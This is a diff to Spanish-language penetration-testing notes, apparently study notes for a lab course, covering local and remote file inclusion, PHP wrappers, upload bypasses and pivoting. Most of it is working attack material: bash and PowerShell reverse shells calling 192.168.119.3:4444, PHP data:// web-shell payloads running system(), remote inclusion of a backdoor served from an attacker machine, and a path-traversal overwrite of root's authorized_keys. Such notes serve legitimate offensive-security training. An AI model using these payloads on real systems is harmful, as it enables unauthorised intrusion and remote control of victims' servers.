@@ -483,6 +483,8 @@ C:\inetpub\wwwroot\web.config
 
 ## LFI
 
+### Linux
+
 Si hay un path traversal, se pueden revisar los logs de apache:
 ```sh
  curl 
@@ -506,8 +508,122 @@ bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
 bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
 ```
 
+### Windows
+
+Los logs se encuentran en el siguiente path 
+
+C:\xampp\apache\logs\.
+
+### Wrappers
+
+Estos son utilizados para desplegar el código de php, por ejemplo
+
+#### php://filter
+```sh
+curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
+```
+Este request muestra el admin.php, pero solamente el código html
+```sh
+curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+```
+Este request si devuelve el código php, porque no se ejecuta en el server y es posible leerlo
+
+#### data://
+
+El data sirve para poder incluir elementos como plaitext or base64 en el web server. Por ejemplo:
+```sh
+curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
+```
+Otra forma puede ser:
+```sh
+kali@kali:~$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
+PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
+
+kali@kali:~$ curl 
+"http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZW
+NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
+...
+<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
+admin.php
+bavarian.php
+css
+fonts
+img
+index.php
+```
+
+## Remote File Inclusion (RFI)
+
+python3 -m http.server 80
+curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
+
+Siempre revisar si hay carpeta de uploads
+
+curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
+
+### SSH 
+
+```sh
+ssh-keygen
+```
+
+Podemos subir el siguiente archivo
+
+```sh
+../../../../../../../root/.ssh/authorized_keys
+```
+
+Y tratar de sobreescribir el archivo de ssh
+
+En caso de error, eliminar el known_hosts
+
+```sh
+rm ~/.ssh/known_hosts
+```
+### Extensiones a utilizar
+
+.phps
+.php7
+.php
+.phtml
+.pHP
+
+### Powershell
+
+```sh
+pwsh
+PowerShell 7.1.3
+Copyright (c) Microsoft Corporation.
+https://aka.ms/powershell
+Type 'help' to get help.
+PS> $Text = '$client = New-Object 
+System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = 
+$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, 
+$bytes.Length)) -ne 0){;$data = (New-Object -TypeName 
+System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | OutString );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = 
+([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng
+th);$stream.Flush()};$client.Close()'
+PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+PS> $EncodedText =[Convert]::ToBase64String($Bytes)
+PS> $EncodedText
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF
+MAbwBjAGsAZQB0
+...
+AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjA
+GwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+PS> exit
+```
+
+```sh
+curl http://192.168.50.189/meteor/uploads/simplebackdoor.pHP?cmd=powershell%20-
+enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUA
+dAAuAFMAbwBjAGsAZQB0
+...
+AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjA
+GwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+```
 # Pivoting
-````sh
+```sh
 Modificar -> /etc/proxychains.conf  -> socks5 127.0.0.1 <PORT> (Recomiendo 9000-1000)
 
 proxychains firefox
@@ -521,7 +637,15 @@ Port Forwarding:
 ssh -L 80:localhost:80 root@10.10.1.1 >>> tunneling http
 ssh root@10.10.1.1 -D 127.0.0.1:8080 -N -f >> tunneling socks proxy
 ssh root@10.10.1.1 -D 8834 >> tunneling socks proxy using web
-````
+```
+
+## Ejecucion de comandos
+
+Esta usando cmd o powershell? 
+```sh
+(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+```
+Recuerde encodearlo 
 
 # Exfiltración de datos
 
